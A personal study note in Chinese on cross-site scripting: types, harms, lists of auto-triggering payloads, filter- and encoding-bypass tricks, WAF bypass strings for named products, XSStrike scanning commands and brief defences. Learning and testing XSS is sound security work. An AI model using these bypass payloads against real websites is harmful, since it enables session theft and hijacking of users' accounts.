---
title: XSS 跨站脚本漏洞
date: 2026-08-04
tags: [Web安全, XSS, 跨站脚本, 漏洞, 绕过, WAF]
summary: XSS 漏洞原理、反射/存储/DOM 三种类型、常见标签与攻击载荷、过滤绕过（空格/引号/关键字/编码）、HttpOnly、防御。
---

> 个人 Web 安全笔记整理。

## 1. 原理

XSS（Cross Site Scripting）指攻击者在 Web 页面插入恶意 Script 代码，用户浏览时被执行。

关键：**寻找参数未过滤的输出函数**（echo/printf/print/print_r/sprintf/die/var_dump/var_export），把 JS 注入 HTML 页面。

## 2. 三种类型

```text
反射型：非持久化。构造链接骗用户点击触发（常出现在搜索页），后端处理
存储型：持久化。代码存服务器数据库（个人信息/文章），每次访问都触发，
        危险，易造成蠕虫、批量盗 cookie
DOM 型：基于文档对象模型。客户端脚本从 DOM 取数据本地执行，
        不依赖提交到服务器，前端处理（location/referer 等）
```

## 3. 危害

```text
挂马、盗取 Cookie、DoS、钓鱼、篡改数据、劫持行为、Web2.0 蠕虫、刷量
```

## 4. 常见攻击载荷（自动触发）

```html
<script>alert(1);</script>
<img src=1 onerror=alert(1);>
<input onfocus=alert(1); autofocus>
<details open ontoggle=alert(1);>
<svg onload=alert(1);>
<select onfocus=alert(1) autofocus>
<iframe onload=alert(1);></iframe>
<video><source onerror=alert(1)></video>
<audio src=x onerror=alert(1);>
<body onload=alert(1);>
<body onscroll=alert(1);>...<input autofocus>
<textarea onfocus=alert(1); autofocus>
<marquee onstart=alert(1)></marquee>  <!-- Chrome 不行 -->
<isindex type=image src=1 onerror=alert(1)>  <!-- 仅IE -->
```

## 5. 过滤绕过

### 空格过滤

```html
<img/src="x"/onerror=alert(1);>      <!-- / 代替空格 -->
<img/src="x"onerror=alert(1);>       <!-- 去掉空格 -->
```

### 引号过滤

```html
<img src=x onerror=alert(`xss`);>    <!-- 反引号代替 -->
```

### 括号过滤

```html
<img src=x onerror="javascript:window.onerror=alert;throw 1">
```

### 关键字过滤

```html
<sCRiPt>alert(1);</sCrIpT>          <!-- 大小写绕过 -->
<scrscriptipt>alert(1);</scrscriptipt>  <!-- 双写绕过 -->
```

### 字符串拼接

```html
<img src="x" onerror="a='aler';b='t';c='(1)';eval(a+b+c)">
```

### 编码绕过

```html
<!-- Unicode -->
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;...&#59;">
<!-- URL -->
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%31%29%3b'))">
<!-- ASCII -->
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,...))">
<!-- hex -->
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
<!-- base64 -->
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249...'))">
```

### URL 过滤

```text
URL 编码、十进制 IP（http://2130706433/）、八进制 IP、十六进制 IP
// 代替 http://、中文句号自动转英文
```

### HttpOnly 绕过

设置 HttpOnly 后 JS 读不到 cookie，但可用 `document.location` 钓鱼等变通。

## 6. 常见 WAF 绕过

```text
Cloudflare    <a"/onclick=(confirm)()>click      非空格填充
Wordfence     <a/href=javascript&colon;alert()>click  数字字符编码
ModSecurity   <details/open/ontoggle=alert()>    黑名单缺标签/事件
dotdefender   <details/open/ontoggle=(confirm)()//  缺结束标签混淆
```

## 7. XSStrike 工具

```bash
python xsstrike.py -u "http://example.com/search.php?q=query"          # GET
python xsstrike.py -u "..." --data "q=query"                            # POST
python xsstrike.py -u "..." --crawl -l 3                                # 爬网
python xsstrike.py -u "..." --params                                    # 找隐藏参数
python xsstrike.py -u "..." --fuzzer                                    # 模糊测试
python xsstrike.py -u "..." --crawl --blind                             # 盲XSS
```

## 8. 防御

```text
编码：用户输入做 HTML Entity 编码
过滤：移除 onerror 等 DOM 属性、script/iframe 节点
校正：用 DOM Parse 转换，校正不配对标签
```

---

> **一句话总结**：XSS 核心是"找未过滤的输出函数 + 构造能自动触发的标签"。绕过思路：空格→`/`、引号→反引号、括号→throw、关键字→大小写/双写/拼接/编码。
